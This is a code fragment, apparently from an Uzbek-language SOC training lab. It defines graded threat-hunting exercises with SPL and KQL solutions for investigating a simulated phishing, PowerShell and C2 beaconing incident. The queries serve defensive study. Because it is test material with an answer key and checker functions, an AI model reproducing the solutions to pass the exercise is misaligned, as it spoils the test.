      solution: [spl('index=sysmon EventCode=1 ParentImage=*\\AppData\\Roaming\\svchost.exe | table _time Image CommandLine')],
      check: ({ siem }) => isSpl(siem) && column(siem!.result, 'CommandLine').some((c) => c.includes('Compress-Archive')),
    },
    {
      id: 'proxy',
      text: `Proksi loglarida \`${C2_HOST}\` ga kimlar murojaat qilgan? \`_time src_ip user url bytes_in category\` jadvali.`,
      hint: `\`index=proxy dest_host=${C2_HOST} | table _time src_ip user url bytes_in category\` — a.ps1 va upd.bin dan tashqari yana ikki xodim havolani ochgan.`,
      solution: [spl(`index=proxy dest_host=${C2_HOST} | table _time src_ip user url bytes_in category`)],
      check: ({ siem }) => isSpl(siem) && siem!.result.rows.length === C2_PROXY_ROWS && CLICKERS.every((u) => column(siem!.result, 'user').includes(u)),
    },
    {
      id: 'clickers',
      text: "Havolani bosgan ikki xodim ham zararlanganmi? Ularning kompyuterlarida Word phishing faylini ochganmi yoki C2 ga firewall orqali ulanganmi — buni bitta so'rov bilan tekshiring: firewall'da C2 ga ulangan **barcha** manba IP'lar.",
      hint: `\`index=firewall dest_ip=${C2_IP} | stats count by src_ip\` — faqat WS-BUX-014. Havola faqat sahifa ochgan; payload ishga tushmagan.`,
      solution: [spl(`index=firewall dest_ip=${C2_IP} | stats count by src_ip`)],
      check: ({ siem }) => isSpl(siem) && colIs(siem!.result, 'src_ip', [VICTIM_IP]),
    },
    {
      id: 'mail',
      teach: ['spl:stats dc', 'spl:stats values'],
      text: "Phishing xati nechta qutiga yetib borgan? Mavzusida `1147` bor xatlarni toping; turli qabul qiluvchilar sonini va jo'natuvchini (`values`) chiqaring.",
      hint: '`index=email subject="*1147*" | stats dc(recipient) as qutilar, values(sender) as jonatuvchi, values(attachment) as ilova`',
      solution: [spl('index=email subject="*1147*" | stats dc(recipient) as qutilar, values(sender) as jonatuvchi, values(attachment) as ilova')],
      check: ({ siem }) => isSpl(siem) && oneNumber(siem!.result, 'qutilar') === 37,
    },
    {
      id: 'opened',
      text: "37 kishidan kim ilovani **ochgan**? Butun muhitda buyruq qatorida `Hisob-faktura_1147.docm` bo'lgan Word jarayonlarini qurilma bo'yicha sanang.",
      hint: `\`index=sysmon EventCode=1 Image=*WINWORD.EXE CommandLine=*${PHISH_FILE}* | stats count by host, User\``,
      solution: [spl(`index=sysmon EventCode=1 Image=*WINWORD.EXE CommandLine=*${PHISH_FILE}* | stats count by host, User`)],
      check: ({ siem }) => isSpl(siem) && colIs(siem!.result, 'host', [VICTIM]),
    },
    {
      id: 'hash',
      text: `IOC qidiruvi: payload'ning SHA-256 xeshi \`${PAYLOAD_SHA256.slice(0, 12)}…\` bilan boshlanadi. Shu xeshli fayl boshqa qurilmalarda ham ishga tushganmi? \`SHA256\` maydoni bo'yicha butun muhitni qidiring va qurilma bo'yicha sanang.`,
      hint: `\`index=sysmon SHA256=${PAYLOAD_SHA256.slice(0, 12)}* | stats count by host\` — yulduzcha bilan boshi yetarli.`,
      solution: [spl(`index=sysmon SHA256=${PAYLOAD_SHA256.slice(0, 12)}* | stats count by host`)],
      check: ({ siem }) => isSpl(siem) && colIs(siem!.result, 'host', [VICTIM]),
    },
    {
      id: 'ti',
      teach: ['spl:lookup', 'spl:lookup AS', 'spl:lookup OUTPUT'],
      text: "Tahdid razvedkasi bilan solishtiring: firewall yozuvlarini `threat_intel` lookup'i bilan boyiting (`indicator` ↔ `dest_ip`) va mos kelganlarini manba, manzil va tahdid bo'yicha sanang.",
      hint: '`index=firewall | lookup threat_intel indicator AS dest_ip OUTPUT threat | where isnotnull(threat) | stats count by src_ip, dest_ip, threat`',
      solution: [spl('index=firewall | lookup threat_intel indicator AS dest_ip OUTPUT threat | where isnotnull(threat) | stats count by src_ip, dest_ip, threat')],
      check: ({ siem }) => isSpl(siem) && siem!.result.columns.includes('threat') && colIs(siem!.result, 'dest_ip', [C2_IP]),
    },
    {
      id: 'kql-word',
      teach: ['kql:where', 'kql:where =~', 'kql:project'],
      text: "Endi **KQL (Sentinel)** yorlig'iga o'ting. Xuddi birinchi savol: `DeviceProcessEvents` da ota-jarayoni `winword.exe` bo'lgan jarayonlar — `Timestamp, DeviceName, FileName, ProcessCommandLine`. Katta-kichik harfga sezgir bo'lmagan `=~` dan foydalaning.",
      hint: 'DeviceProcessEvents | where InitiatingProcessFileName =~ "winword.exe" | project Timestamp, DeviceName, FileName, ProcessCommandLine',
      solution: [kql('DeviceProcessEvents | where InitiatingProcessFileName =~ "winword.exe" | project Timestamp, DeviceName, FileName, ProcessCommandLine')],
      check: ({ siem }) => isKql(siem) && colIs(siem!.result, 'FileName', ['powershell.exe']) && siem!.result.columns.length === 4,
    },
    {
      id: 'kql-c2',
      teach: ['kql:summarize', 'kql:summarize count', 'kql:summarize min'],
      text: "`DeviceNetworkEvents` da C2 manziliga ulangan qurilma va jarayonlar: har biri uchun ulanishlar soni, birinchi va oxirgi vaqt.",
      hint: `DeviceNetworkEvents | where RemoteIP == "${C2_IP}" | summarize count(), min(Timestamp), max(Timestamp) by DeviceName, InitiatingProcessFileName`,
      solution: [kql(`DeviceNetworkEvents | where RemoteIP == "${C2_IP}" | summarize count(), min(Timestamp), max(Timestamp) by DeviceName, InitiatingProcessFileName`)],
      check: ({ siem }) => isKql(siem) && siem!.result.columns.includes('min_Timestamp') && colIs(siem!.result, 'InitiatingProcessFileName', ['powershell.exe', 'svchost.exe']),
    },
    {
      id: 'kql-chart',
      teach: ['kql:summarize bin', 'kql:render'],
      text: "Beacon grafigini KQL'da chizing: C2 ga ulanishlar 5 daqiqalik oraliqlarda, `render timechart` bilan.",
      hint: `DeviceNetworkEvents | where RemoteIP == "${C2_IP}" | summarize count() by bin(Timestamp, 5m) | render timechart`,
      solution: [kql(`DeviceNetworkEvents | where RemoteIP == "${C2_IP}" | summarize count() by bin(Timestamp, 5m) | render timechart`)],
      check: ({ siem }) => isKql(siem) && !!siem!.result.chart && siem!.result.timeColumns.includes('Timestamp'),
    },
    {
      id: 'kql-mail',
      teach: ['kql:where has', 'kql:summarize dcount'],
      text: "`EmailEvents` da mavzusida `1147` so'zi bor xatlar nechta turli qutiga borgan? `has` bilan qidiring.",
      hint: 'EmailEvents | where Subject has "1147" | summarize dcount(RecipientEmailAddress)',
      solution: [kql('EmailEvents | where Subject has "1147" | summarize dcount(RecipientEmailAddress)')],
      check: ({ siem }) => isKql(siem) && oneNumber(siem!.result) === 37,
    },
    {
      id: 'kql-registry',
      teach: ['kql:sort', 'kql:sort asc', 'kql:take'],
      text: "`DeviceRegistryEvents` da Run kalitiga yozilgan qiymatlarni vaqt bo'yicha **eng eskisidan** boshlab chiqaring. Diqqat: KQL'da `sort by` sukut bo'yicha kamayish tartibida!",
      hint: 'DeviceRegistryEvents | where RegistryKey endswith @"CurrentVersion\\Run" | sort by Timestamp asc | project Timestamp, DeviceName, RegistryValueName, RegistryValueData, InitiatingProcessFileName — msiexec: Teams o\'rnatuvchisi, Updater: payload.',
      solution: [kql('DeviceRegistryEvents | where RegistryKey endswith @"CurrentVersion\\Run" | sort by Timestamp asc | project Timestamp, DeviceName, RegistryValueName, RegistryValueData, InitiatingProcessFileName')],
      check: ({ siem }) => {
        const r = siem?.result;
        if (!isKql(siem) || !r || r.error || !r.columns.includes('RegistryValueName')) return false;
        const names = column(r, 'RegistryValueName');
        const times = column(r, 'Timestamp');
        return names.includes('Updater') && names.includes('Teams') && times.every((t, i) => i === 0 || times[i - 1]! <= t);
      },
    },
    {
      id: 'challenge',
      challenge: true,
      text: "Mustaqil vazifa (KQL). Hujumchi qancha vaqt boshqaruvda bo'lgan? Bitta so'rov bilan C2 ga **birinchi** va **oxirgi** ulanish orasidagi vaqtni butun daqiqalarda hisoblang; natija `Daqiqa` nomli ustunda bo'lsin.",
      hint: "summarize bilan min va max ni oling, keyin extend. KQL'da ikki vaqt farqi — timespan; uni `1m` ga bo'lsangiz, daqiqalar soni chiqadi; `toint()` butun qiladi.",
      solution: [kql(`DeviceNetworkEvents | where RemoteIP == "${C2_IP}" | summarize Boshi = min(Timestamp), Oxiri = max(Timestamp) | extend Daqiqa = toint((Oxiri - Boshi) / 1m)`)],
      check: ({ siem }) => isKql(siem) && oneNumber(siem!.result, 'Daqiqa') === C2_MINUTES,
    },
  ],
};

